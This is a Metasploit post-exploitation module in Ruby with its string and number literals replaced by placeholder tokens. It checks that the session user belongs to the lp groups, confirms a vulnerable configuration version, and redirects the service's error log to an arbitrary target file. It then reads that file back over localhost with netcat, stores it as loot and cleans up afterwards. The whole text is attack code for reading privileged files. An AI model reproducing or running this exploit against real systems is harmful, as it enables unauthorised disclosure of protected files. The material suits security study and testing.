require <str> class Metasploit3 < Msf :: Post include Msf :: Post :: File LP_GROUPS = [ <str> , <str> ] attr_accessor <str> , <str> def initialize ( info = { } ) super ( update_info ( info , { <str> = > <str> , <str> = > <str> , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > <str> , <str> = > <str> } ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def check_exploitability user = cmd_exec ( <str> ) user_groups = cmd_exec ( <str> [ user ] . shelljoin <str> ) . split ( <str> ) if ( user_groups & LP_GROUPS ) . empty? print_error <str> return Msf :: Exploit :: CheckCode :: Safe else print_good <str> end if ctl_path . blank? print_error <str> return Msf :: Exploit :: CheckCode :: Safe else print_good <str> end nc_path = whereis ( <str> ) if nc_path . nil? or nc_path . blank? print_error <str> return Msf :: Exploit :: CheckCode :: Unknown else print_good <str> end config_path = whereis ( <str> ) config_vn = nil if config_path . nil? or config_path . blank? output = get_request ( <str> ) if output =~ <str> config_vn = $1 . strip end else config_vn = cmd_exec ( <str> ) . strip end if config_vn . nil? print_error <str> return Msf :: Exploit :: CheckCode :: Unknown end print_status <str> config_vn <str> config_parts = config_vn . split ( <str> ) if config_vn . to_f < <int> . <int> or ( config_vn . to_f < = <int> . <int> and config_parts [ <int> ] . to_i < <int> ) Msf :: Exploit :: CheckCode :: Vulnerable else Msf :: Exploit :: CheckCode :: Safe end end def run if check_exploitability == Msf :: Exploit :: CheckCode :: Safe print_error <str> return end defaults = cmd_exec ( ctl_path ) @web_server_was_disabled = defaults =~ <str> cmd_exec ( <str> ctl_path <str> datastore [ <str> ] <str> ) cmd_exec ( <str> ctl_path <str> ) @error_log_was_reset = true file = strip_http_headers ( get_request ( <str> ) ) f = File . basename ( datastore [ <str> ] ) loot = store_loot ( <str> , <str> , session , file , f ) print_good ( <str> datastore [ <str> ] <str> file . length <str> loot <str> ) end def cleanup print_status <str> cmd_exec ( <str> ctl_path <str> ) if web_server_was_disabled cmd_exec ( <str> ctl_path <str> prev_error_log_path <str> ) if error_log_was_reset super end private def prev_error_log_path datastore [ <str> ] end def ctl_path @ctl_path || = whereis ( <str> ) end def strip_http_headers ( http ) http . gsub ( <str> , <str> ) end def whereis ( exe ) line = cmd_exec ( <str> exe <str> ) if line =~ <str> $1 else line end end def get_request ( uri ) output = perform_request ( uri , <str> ) if output =~ <str> output = perform_request ( uri , <str> ) end output end def perform_request ( uri , nc_str ) cmd_exec ( [ <str> , <str> uri <str> . inspect , <str> , nc_str ] . join ( <str> ) ) end end 
